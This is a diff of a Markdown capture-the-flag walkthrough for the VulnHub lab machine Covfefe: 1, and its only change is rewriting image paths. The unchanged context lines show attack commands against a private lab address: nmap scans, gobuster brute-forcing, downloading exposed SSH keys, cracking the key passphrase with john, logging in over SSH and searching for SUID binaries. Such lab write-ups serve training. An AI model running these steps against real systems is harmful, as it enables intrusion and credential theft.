@@ -3,7 +3,7 @@
 - **Machine:** Covfefe: 1
 - **Download:** https://www.vulnhub.com/entry/covfefe-1,199/
 
-![](838-1.png)
+![](images/838-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](838-2.png)
+![](images/838-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.105
 ```
 
-![](838-3.png)
+![](images/838-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ This command performs an aggressive scan and uses the `http-enum` NSE script to 
 nmap -v -p 80,8080 -sT -sV -A --script=http-enum.nse 192.168.2.105
 ```
 
-![](838-4.png)
+![](images/838-4.png)
 
 ---
 
@@ -80,7 +80,7 @@ Perform directory brute-forcing against port **31337**.
 gobuster dir -u http://192.168.2.105:31337 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
 ```
 
-![](838-5.png)
+![](images/838-5.png)
 
 ---
 
@@ -90,7 +90,7 @@ Visit the following endpoint:
 
 - http://192.168.2.105:31337/robots.txt
 
-![](838-6.png)
+![](images/838-6.png)
 
 ---
 
@@ -100,7 +100,7 @@ Browse to:
 
 - http://192.168.2.105:31337/taxes/
 
-![](838-7.png)
+![](images/838-7.png)
 
 ### Flag 1
 
@@ -116,7 +116,7 @@ Visit:
 
 - http://192.168.2.105:31337/.ssh
 
-![](838-8.png)
+![](images/838-8.png)
 
 The web server exposes SSH-related files.
 
@@ -140,7 +140,7 @@ wget http://192.168.2.105:31337/.ssh/authorized_keys
 wget http://192.168.2.105:31337/.ssh/id_rsa.pub
 ```
 
-![](838-9.png)
+![](images/838-9.png)
 
 ---
 
@@ -158,7 +158,7 @@ cat authorized_keys
 cat id_rsa.pub
 ```
 
-![](838-10.png)
+![](images/838-10.png)
 
 ---
 
@@ -176,7 +176,7 @@ Crack the passphrase.
 john id_rsa.hash --wordlist=/opt/rockyou.txt
 ```
 
-![](838-11.png)
+![](images/838-11.png)
 
 ---
 
@@ -196,7 +196,7 @@ Authenticate using the recovered private key.
 ssh -i id_rsa simon@192.168.2.105
 ```
 
-![](838-12.png)
+![](images/838-12.png)
 
 ---
 
@@ -208,7 +208,7 @@ ssh -i id_rsa simon@192.168.2.105
 ls -al
 ```
 
-![](838-13.png)
+![](images/838-13.png)
 
 ---
 
@@ -226,7 +226,7 @@ cat .bash_history
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](838-14.png)
+![](images/838-14.png)
 
 ---
 
@@ -238,7 +238,7 @@ Execute the custom SUID binary.
 /usr/local/bin/read_message
 ```
 
-![](838-15.png)
+![](images/838-15.png)
 
 ---
 
@@ -250,7 +250,7 @@ Read the source code from the root user's home directory.
 cat /root/read_message.c
 ```
 
-![](838-16.png)
+![](images/838-16.png)
 
 ### Flag 2
 
@@ -300,7 +300,7 @@ ls
 cat flag.txt
 ```
 
-![](838-17.png)
+![](images/838-17.png)
 
 ### Flag 3
 
